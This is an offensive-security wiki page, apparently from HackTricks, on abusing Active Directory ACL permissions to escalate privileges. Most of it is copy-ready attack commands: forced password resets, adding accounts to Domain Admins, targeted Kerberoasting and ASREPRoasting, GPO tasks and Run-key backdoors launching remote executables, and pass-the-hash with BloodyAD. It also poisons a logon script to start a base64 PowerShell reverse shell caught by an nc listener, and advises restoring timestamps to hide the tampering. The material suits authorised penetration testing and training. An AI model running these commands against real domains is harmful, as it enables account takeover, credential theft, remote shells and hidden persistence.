# Abusing Active Directory ACLs/ACEs

{{#include ../../../banners/hacktricks-training.md}}

**This page is mostly a summary of the techniques from** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **and** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. For more details, check the original articles.**

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **GenericAll Rights on User**

This privilege grants an attacker full control over a target user account. Once `GenericAll` rights are confirmed using the `Get-ObjectAcl` command, an attacker can:

- **Change the Target's Password**: Using `net user <username> <password> /domain`, the attacker can reset the user's password.
- From Linux, you can do the same over SAMR with Samba `net rpc`:

```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```

- **If the account is disabled, clear the UAC flag**: `GenericAll` allows editing `userAccountControl`. From Linux, BloodyAD can remove the `ACCOUNTDISABLE` flag:

```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```

- **Targeted Kerberoasting**: Assign an SPN to the user's account to make it kerberoastable, then use Rubeus and targetedKerberoast.py to extract and attempt to crack the ticket-granting ticket (TGT) hashes.

```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```

- **Targeted ASREPRoasting**: Disable pre-authentication for the user, making their account vulnerable to ASREPRoasting.

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- **Shadow Credentials / Key Credential Link**: With `GenericAll` on a user you can add a certificate-based credential and authenticate as them without changing their password. See:

{{#ref}}
shadow-credentials.md
{{#endref}}

## **GenericAll Rights on Group**

This privilege allows an attacker to manipulate group memberships if they have `GenericAll` rights on a group like `Domain Admins`. After identifying the group's distinguished name with `Get-NetGroup`, the attacker can:

- **Add Themselves to the Domain Admins Group**: This can be done via direct commands or using modules like Active Directory or PowerSploit.

```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```

- From Linux you can also leverage BloodyAD to add yourself into arbitrary groups when you hold GenericAll/Write membership over them. If the target group is nested into “Remote Management Users”, you will immediately gain WinRM access on hosts honoring that group:

```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```

## **GenericAll / GenericWrite / Write on Computer/User**

Holding these privileges on a computer object or a user account allows for:

- **Kerberos Resource-based Constrained Delegation**: Enables taking over a computer object.
- **Shadow Credentials**: Use this technique to impersonate a computer or user account by exploiting the privileges to create shadow credentials.

## **WriteProperty on Group**

If a user has `WriteProperty` rights on all objects for a specific group (e.g., `Domain Admins`), they can:

- **Add Themselves to the Domain Admins Group**: Achievable via combining `net user` and `Add-NetGroupUser` commands, this method allows privilege escalation within the domain.

```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

## **Self (Self-Membership) on Group**

This privilege enables attackers to add themselves to specific groups, such as `Domain Admins`, through commands that manipulate group membership directly. Using the following command sequence allows for self-addition:

```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

## **WriteProperty (Self-Membership)**

A similar privilege, this allows attackers to directly add themselves to groups by modifying group properties if they have the `WriteProperty` right on those groups. The confirmation and execution of this privilege are performed with:

```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```

## **ForceChangePassword**

Holding the `ExtendedRight` on a user for `User-Force-Change-Password` allows password resets without knowing the current password. Verification of this right and its exploitation can be done through PowerShell or alternative command-line tools, offering several methods to reset a user's password, including interactive sessions and one-liners for non-interactive environments. The commands range from simple PowerShell invocations to using `rpcclient` on Linux, demonstrating the versatility of attack vectors.

```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```

## **WriteOwner on Group**

If an attacker finds that they have `WriteOwner` rights over a group, they can change the ownership of the group to themselves. This is particularly impactful when the group in question is `Domain Admins`, as changing ownership allows for broader control over group attributes and membership. The process involves identifying the correct object via `Get-ObjectAcl` and then using `Set-DomainObjectOwner` to modify the owner, either by SID or name.

```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```

## **GenericWrite on User**

This permission allows an attacker to modify user properties. Specifically, with `GenericWrite` access, the attacker can change the logon script path of a user to execute a malicious script upon user logon. This is achieved by using the `Set-ADObject` command to update the `scriptpath` property of the target user to point to the attacker's script.

```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```

## **GenericWrite on Group**

With this privilege, attackers can manipulate group membership, such as adding themselves or other users to specific groups. This process involves creating a credential object, using it to add or remove users from a group, and verifying the membership changes with PowerShell commands.

```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```

- From Linux, Samba `net` can add/remove members when you hold `GenericWrite` on the group (useful when PowerShell/RSAT are unavailable):

```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```

## **WriteDACL + WriteOwner**

Owning an AD object and having `WriteDACL` privileges on it enables an attacker to grant themselves `GenericAll` privileges over the object. This is accomplished through ADSI manipulation, allowing for full control over the object and the ability to modify its group memberships. Despite this, limitations exist when trying to exploit these privileges using the Active Directory module's `Set-Acl` / `Get-Acl` cmdlets.

```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```

### WriteDACL/WriteOwner quick takeover (PowerView)

When you have `WriteOwner` and `WriteDacl` over a user or service account, you can take full control and reset its password using PowerView without knowing the old password:

```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```

Notes:
- You may need to first change the owner to yourself if you only have `WriteOwner`:

```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```

- Validate access with any protocol (SMB/LDAP/RDP/WinRM) after password reset.

## **Replication on the Domain (DCSync)**

The DCSync attack leverages specific replication permissions on the domain to mimic a Domain Controller and synchronize data, including user credentials. This powerful technique requires permissions like `DS-Replication-Get-Changes`, allowing attackers to extract sensitive information from the AD environment without direct access to a Domain Controller. [**Learn more about the DCSync attack here.**](../dcsync.md)

## GPO Delegation <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO Delegation

Delegated access to manage Group Policy Objects (GPOs) can present significant security risks. For instance, if a user such as `offense\spotless` is delegated GPO management rights, they may have privileges like **WriteProperty**, **WriteDacl**, and **WriteOwner**. These permissions can be abused for malicious purposes, as identified using PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

### Enumerate GPO Permissions

To identify misconfigured GPOs, PowerSploit's cmdlets can be chained together. This allows for the discovery of GPOs that a specific user has permissions to manage: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Computers with a Given Policy Applied**: It's possible to resolve which computers a specific GPO applies to, helping understand the scope of potential impact. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Policies Applied to a Given Computer**: To see what policies are applied to a particular computer, commands like `Get-DomainGPO` can be utilized.

**OUs with a Given Policy Applied**: Identifying organizational units (OUs) affected by a given policy can be done using `Get-DomainOU`.

You can also use the tool [**GPOHound**](https://github.com/cogiceo/GPOHound) to enumerate GPOs and find issues in them.

### Abuse GPO - New-GPOImmediateTask

Misconfigured GPOs can be exploited to execute code, for example, by creating an immediate scheduled task. This can be done to add a user to the local administrators group on affected machines, significantly elevating privileges:

```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```

### GroupPolicy module - Abuse GPO

The GroupPolicy module, if installed, allows for the creation and linking of new GPOs, and setting preferences such as registry values to execute backdoors on affected computers. This method requires the GPO to be updated and a user to log in to the computer for execution:

```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```

### SharpGPOAbuse - Abuse GPO

SharpGPOAbuse offers a method to abuse existing GPOs by adding tasks or modifying settings without the need to create new GPOs. This tool requires modification of existing GPOs or using RSAT tools to create new ones before applying changes:

```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```

### Force Policy Update

GPO updates typically occur around every 90 minutes. To expedite this process, especially after implementing a change, the `gpupdate /force` command can be used on the target computer to force an immediate policy update. This command ensures that any modifications to GPOs are applied without waiting for the next automatic update cycle.

### Under the Hood

Upon inspection of the Scheduled Tasks for a given GPO, like the `Misconfigured Policy`, the addition of tasks such as `evilTask` can be confirmed. These tasks are created through scripts or command-line tools aiming to modify system behavior or escalate privileges.

The structure of the task, as shown in the XML configuration file generated by `New-GPOImmediateTask`, outlines the specifics of the scheduled task - including the command to be executed and its triggers. This file represents how scheduled tasks are defined and managed within GPOs, providing a method for executing arbitrary commands or scripts as part of policy enforcement.

### Users and Groups

GPOs also allow for the manipulation of user and group memberships on target systems. By editing the Users and Groups policy files directly, attackers can add users to privileged groups, such as the local `administrators` group. This is possible through the delegation of GPO management permissions, which permits the modification of policy files to include new users or change group memberships.

The XML configuration file for Users and Groups outlines how these changes are implemented. By adding entries to this file, specific users can be granted elevated privileges across affected systems. This method offers a direct approach to privilege escalation through GPO manipulation.

Furthermore, additional methods for executing code or maintaining persistence, such as leveraging logon/logoff scripts, modifying registry keys for autoruns, installing software via .msi files, or editing service configurations, can also be considered. These techniques provide various avenues for maintaining access and controlling target systems through the abuse of GPOs.

## SYSVOL/NETLOGON Logon Script Poisoning

Writable paths under `\\<dc>\SYSVOL\<domain>\scripts\` or `\\<dc>\NETLOGON\` allow tampering with logon scripts executed at user logon via GPO. This yields code execution in the security context of logging users.

### Locate logon scripts
- Inspect user attributes for a configured logon script:

```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```

- Crawl domain shares to surface shortcuts or references to scripts:

```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```

- Parse `.lnk` files to resolve targets pointing into SYSVOL/NETLOGON (useful DFIR trick and for attackers without direct GPO access):

```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```

- BloodHound displays the `logonScript` (scriptPath) attribute on user nodes when present.

### Validate write access (don’t trust share listings)
Automated tooling may show SYSVOL/NETLOGON as read-only, but underlying NTFS ACLs can still allow writes. Always test:

```bash
# Interactive write test
smbclient \\<dc>\SYSVOL -U <user>%<pass>
smb: \\> cd <domain>\scripts\
smb: \\<domain>\scripts\\> put smallfile.txt login.vbs   # check size/time change
```

If file size or mtime changes, you have write. Preserve originals before modifying.

### Poison a VBScript logon script for RCE
Append a command that launches a PowerShell reverse shell (generate from revshells.com) and keep original logic to avoid breaking business function:

```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```

Listen on your host and wait for the next interactive logon:

```bash
rlwrap -cAr nc -lnvp 443
```

Notes:
- Execution happens under the logging user’s token (not SYSTEM). Scope is the GPO link (OU, site, domain) applying that script.
- Clean up by restoring the original content/timestamps after use.


## BloodyAD: LDAP-native ACL abuse from Linux

bloodyAD performs low-level LDAP modify/add operations directly against DCs to turn AD ACLs/ACEs into impact. Useful when you have WriteProperty/GenericWrite/GenericAll/ExtendedRight over users, computers, groups, DNS objects or zones.

- Quickstart (PTH password reset):
```bash
bloodyAD --host <dc_fqdn_or_ip> -d <domain> -u <you> -p :<NTLMHash> set password <target.user> 'NewPassw0rd!'
```
- Shadow credentials (KeyCredential abuse, certificate-based persistence):
```bash
# Adds msDS-KeyCredentialLink on target and attempts PKINIT, dropping a TGT ccache and NT hash material
bloodyAD --host <dc> -d <domain> -u <you> -p '<pass>' add shadowCredentials <target.user> --path shadow-<target>
# Result: writes shadow-<target>.ccache (if PKINIT succeeds) or shadow-<target>.pfx for offline PKINIT
```
- AD-integrated DNS record manipulation: see [AD DNS Records](../ad-dns-records.md).

Authentication and transport:
- Cleartext: `-p '<Password>'`
- Pass-the-Hash: `-p :<NTLMHash>` (LM:NTH also supported)
- Pass-the-Ticket (Kerberos): `-k ccache=/path/tgt.ccache` (or `kirbi=/path.tgs`, `keytab=/path`)
  - Example: `KRB5CCNAME=/tmp/tgt.ccache bloodyAD --host <dc> -k ccache=/tmp/tgt.ccache add groupMember "Domain Admins" <you>`
- Client certificate: `-c key.pem:cert.pem` for Schannel bind, or combine with `-k` for PKINIT
- TLS/Sign: `-s` to use LDAPS/GC over TLS; `-ss` to disable all LDAP signing/encryption (debug only)
- Proxies: transparent SOCKS proxying supported (see project wiki)

Notes:
- Password reset with set password requires ForceChangePassword/GenericWrite/GenericAll on the target.
- Shadow credentials require write on msDS-KeyCredentialLink of the target object and a DC with PKINIT-capable CA.
- ADIDNS updates require create/modify rights on the zone/dnsNode; Authenticated Users can often create new records in default zones.

## References

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://wald0.com/?p=112](https://wald0.com/?p=112)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule\_\_ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [BloodyAD – AD attribute/UAC operations from Linux](https://github.com/CravateRouge/bloodyAD)
- [Samba – net rpc (group membership)](https://www.samba.org/)
- [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, and DPAPI decryption to DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)

- [bloodyAD Wiki](https://github.com/CravateRouge/bloodyAD/wiki)
- [autobloody – automated AD privesc paths](https://github.com/CravateRouge/autobloody)

{{#include ../../../banners/hacktricks-training.md}}


